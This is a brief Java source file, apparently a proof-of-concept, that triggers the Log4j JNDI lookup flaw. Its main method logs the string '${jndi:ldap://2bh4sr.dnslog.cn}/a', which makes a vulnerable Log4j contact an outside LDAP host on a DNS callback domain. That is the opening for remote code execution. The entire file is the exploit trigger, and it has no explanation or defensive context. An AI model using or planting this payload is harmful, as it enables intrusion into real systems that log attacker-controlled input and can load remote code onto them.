package jihe;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class log4jRCE {

    private static final Logger logger = LogManager.getLogger(log4jRCE.class);

    public static void main(String[] agrs){
        logger.error("${jndi:ldap://2bh4sr.dnslog.cn}/a");

    }

}

